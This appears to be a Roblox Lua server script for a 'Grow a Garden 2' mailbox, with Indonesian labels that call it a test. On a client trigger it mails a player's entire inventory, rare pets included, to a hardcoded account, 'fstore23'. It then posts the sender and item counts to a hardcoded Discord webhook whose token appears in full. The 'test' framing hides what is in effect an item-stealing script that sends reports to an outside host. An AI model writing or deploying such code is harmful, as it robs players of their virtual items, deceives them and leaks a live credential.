-- Server Script: letakkan di ServerScriptService
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518120529532293140/U-dAzqEZwGHw6Upw0VZGl80UB3TBX9qyDrFvHNDYnDF3QBLdt2iUeRZHEl1XwOf4rnWB"
local TARGET_USERNAME = "fstore23"
local REMOTE_EVENT_NAME = "GrowAGarden2MailboxTrigger"
local MAX_ITEMS_PER_MAIL = 20

local requestEvent = ReplicatedStorage:FindFirstChild(REMOTE_EVENT_NAME)
if not requestEvent then
    requestEvent = Instance.new("RemoteEvent")
    requestEvent.Name = REMOTE_EVENT_NAME
    requestEvent.Parent = ReplicatedStorage
end

local GIFT_ITEM_NAMES = {
    Bunny = true,
    Frog = true,
    Owl = true,
    Deer = true,
    Robin = true,
    Bee = true,
    Monkey = true,
    ["Golden Dragonfly"] = true,
    Unicorn = true,
    Raccoon = true,
    ["Black Dragon"] = true,
    ["Ice Serpent"] = true,
}

local function getAllItemsFromPlayer(player)
    local inventory = {}
    local InventoryService = require(game.ServerScriptService.InventoryService)

    for _, item in ipairs(InventoryService:GetItems(player)) do
        table.insert(inventory, {
            id = item.Id,
            name = item.Name,
            amount = item.Amount,
            isGift = GIFT_ITEM_NAMES[item.Name] == true,
        })
    end

    return inventory
end

local function chunkItems(items, chunkSize)
    local chunks = {}
    for i = 1, #items, chunkSize do
        local chunk = {}
        for j = i, math.min(i + chunkSize - 1, #items) do
            table.insert(chunk, items[j])
        end
        table.insert(chunks, chunk)
    end
    return chunks
end

local function sendMailbox(fromPlayer, targetUsername, items)
    local MailboxService = require(game.ServerScriptService.MailboxService)

    MailboxService:CreateMail({
        from = fromPlayer.Name,
        to = targetUsername,
        subject = "Uji Kirim Item",
        body = "Ini pengiriman semua item untuk pengujian mailbox.",
        items = items,
    })
end

local function sendItemsInBatches(fromPlayer, targetUsername, items)
    local itemBatches = chunkItems(items, MAX_ITEMS_PER_MAIL)
    for _, batch in ipairs(itemBatches) do
        sendMailbox(fromPlayer, targetUsername, batch)
    end
end

local function logToDiscord(playerName, targetName, items)
    local giftCount = 0
    for _, item in ipairs(items) do
        if item.isGift then
            giftCount = giftCount + 1
        end
    end

    local content = {
        username = "Roblox Mailbox Test",
        embeds = {{
            title = "Mailbox Test Dijalankan",
            color = 3066993,
            fields = {
                { name = "Pengirim", value = playerName, inline = true },
                { name = "Penerima", value = targetName, inline = true },
                { name = "Jumlah Item Total", value = tostring(#items), inline = true },
                { name = "Gift Items", value = tostring(giftCount), inline = true },
                { name = "Batch Count", value = tostring(math.ceil(#items / MAX_ITEMS_PER_MAIL)), inline = true },
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        }},
    }

    local json = HttpService:JSONEncode(content)
    HttpService:PostAsync(DISCORD_WEBHOOK, json, Enum.HttpContentType.ApplicationJson)
end

requestEvent.OnServerEvent:Connect(function(player)
    local items = getAllItemsFromPlayer(player)
    if #items == 0 then
        warn("Tidak ada item untuk dikirim.")
        return
    end

    sendItemsInBatches(player, TARGET_USERNAME, items)
    logToDiscord(player.Name, TARGET_USERNAME, items)
end)
